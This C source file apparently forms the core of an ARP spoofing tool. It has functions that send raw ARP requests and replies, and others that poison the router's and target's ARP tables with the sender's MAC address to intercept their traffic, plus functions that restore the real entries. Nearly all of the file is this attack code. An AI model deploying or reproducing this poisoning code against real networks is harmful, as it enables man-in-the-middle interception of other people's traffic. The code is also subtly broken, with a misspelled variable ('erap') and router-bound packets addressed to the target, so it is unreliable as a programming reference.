
# include <proginfo.h>
# include <arp.h>

# include <inttypes.h>
# include <linux/if_ether.h>
# include <netinet/if_ether.h>


# include <string.h> ///TODO: Must use mine

///TODO: Set bits in MAC's for multicast

static err_t   send_arp(int fd, const struct sockaddr* dest, const struct ether_arp* earp)
{
    uint8_t buff[sizeof(*earp)] = {0};

    struct ether_arp* earp_buffptr = (struct ether_arp*)buff;
    *earp_buffptr = *earp;

    const ssize_t sentbytes = sendto(fd, buff, sizeof(*earp), 0, dest, sizeof(*dest));

    if (sentbytes < 0)
    {
        ///TODO: Print error
        return INVSYSCALL;
    }

    return SUCCESS;
}

/// Send standart ARP Request to the target, the target should reply.
err_t   send_arp_request_to_target(const proginfo_t* const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),  
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REQUEST),
    };

    memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
    memcpy(erap.arp_spa, info->mymachine.ip, SIZEOFIP);
    memcpy(earp.arp_tha, ETHER_BROADCAST_MAC, SIZEOFMAC);
    memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);

    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
	(const struct ether_arp*)&earp);
}

/// Send standart ARP Request to the router, the router should reply.
err_t   send_arp_request_to_router(const proginfo_t* const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),  
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REQUEST),
    };

    memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
    memcpy(erap.arp_spa, info->mymachine.ip, SIZEOFIP);
    memcpy(earp.arp_tha, ETHER_BROADCAST_MAC, SIZEOFMAC);
    memcpy(earp.arp_tpa, info->router.ip, SIZEOFIP);

    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
	(const struct ether_arp*)&earp);
}

/// Send standart ARP Reply to target
err_t   send_arp_reply_to_target(const proginfo_t* const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),  
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
    memcpy(erap.arp_spa, info->mymachine.ip, SIZEOFIP);
    memcpy(earp.arp_tha, info->target.mac, SIZEOFMAC);
    memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);

    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
	(const struct ether_arp*)&earp);
}

/// Spoof my MAC address into router's ARP table at target's ip index.
err_t   spoof_router(const proginfo_t* const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),  
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
    memcpy(erap.arp_spa, info->target.ip, SIZEOFIP);
    memcpy(earp.arp_tha, info->router.mac, SIZEOFMAC);
    memcpy(earp.arp_tpa, info->router.ip, SIZEOFIP);

    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
	(const struct ether_arp*)&earp);
}

/// Spoof my MAC address into target's ARP table at router's ip index.
err_t   spoof_target(const proginfo_t* const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),  
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
    memcpy(erap.arp_spa, info->router.ip, SIZEOFIP);
    memcpy(earp.arp_tha, info->target.mac, SIZEOFMAC);
    memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);

    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
	(const struct ether_arp*)&earp);
}

/// Remove my spoofed MAC address from target's ARP table (at router's ip index)
err_t	reset_arp_target(const proginfo_t* const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),  
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

	memcpy(erap.arp_sha, info->router.mac, SIZEOFMAC);
    memcpy(erap.arp_spa, info->router.ip, SIZEOFIP);
    memcpy(earp.arp_tha, info->target.mac, SIZEOFMAC);
    memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);

    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
	(const struct ether_arp*)&earp);
}

/// Remove my spoofed MAC address from router's ARP table (at target's ip index)
err_t	reset_arp_router(const proginfo_t* const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),  
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

	memcpy(erap.arp_sha, info->target.mac, SIZEOFMAC);
    memcpy(erap.arp_spa, info->target.ip, SIZEOFIP);
    memcpy(earp.arp_tha, info->router.mac, SIZEOFMAC);
    memcpy(earp.arp_tpa, info->router.ip, SIZEOFIP);

    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
	(const struct ether_arp*)&earp);
}
